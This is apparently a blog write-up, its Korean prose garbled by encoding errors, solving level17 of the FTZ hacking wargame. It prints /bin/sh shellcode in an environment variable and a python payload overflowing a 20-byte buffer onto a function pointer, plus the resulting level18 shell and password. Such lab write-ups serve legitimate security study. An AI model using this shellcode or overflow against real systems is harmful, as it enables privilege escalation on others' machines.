---
title: "[FTZ] level17 í’€ì´"
categories:
  - ftz
tags:
  - FTZ
toc: true
toc_sticky: true
toc_label: "level17 í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/ftz.png
---

ğŸ’¡ FTZ level17 í’€ì´
{: .notice--warning}


# ë¬¸ì œ

ê³„ì • : level17/king poetic

**hint**
```c
#include <stdio.h>

void printit() {
  printf("Hello there!\n");
}

main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}

```

# í’€ì´
16ë²ˆê³¼ ë™ì¼í•œë°, ì‰˜ ì½”ë“œê°€ ì£¼ì–´ì§€ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.
ë”°ë¼ì„œ ê¸°ì¡´ì— í•˜ë˜ ë°©ì‹ìœ¼ë¡œ í™˜ê²½ë³€ìˆ˜ì— ì‰˜ ì½”ë“œë¥¼ ë„£ê³ ,
ì£¼ì†Œë¥¼ í™˜ê²½ë³€ìˆ˜ë¡œ ë°”ê¿”ì£¼ë©´ ë©ë‹ˆë‹¤.

í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„ ì–¸í•˜ê³ , ê·¸ ì£¼ì†Œë¥¼ êµ¬í•´ ì¤ë‹ˆë‹¤.

```sh
[level17@ftz level17]$ export SHELLCODE=$(python -c 'print("\x90"*30+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")')
[level17@ftz level17]$
[level17@ftz level17]$ cd tmp
[level17@ftz tmp]$ echo 'int main(){printf("%p\n",getenv("SHELLCODE"));}' >> env.c
[level17@ftz tmp]$ gcc -o env env.c
[level17@ftz tmp]$ ./env
0xbffffc6d
```

call ì£¼ì†Œë¥¼ 0xbffffc6dë¡œ ë®ì–´ì¤ë‹ˆë‹¤.

gdbë¥¼ ë¶„ì„í•˜ëŠ”ê±´ ìƒëµí•˜ê² ìŠµë‹ˆë‹¤.

call ë³€ìˆ˜ì™€ buf ë³€ìˆ˜ì˜ ì°¨ì´ëŠ” 40ë°”ì´íŠ¸ ì…ë‹ˆë‹¤.

```sh
[level17@ftz level17]$ (python -c 'print("A"*40+"\x6d\xfc\xff\xbf")';cat) | ./attackme

id
uid=3098(level18) gid=3097(level17) groups=3097(level17)
my-pass
TERM environment variable not set.

Level18 Password is "why did you do it".

```

ì‰˜ì„ íšë“í–ˆìŠµë‹ˆë‹¤.
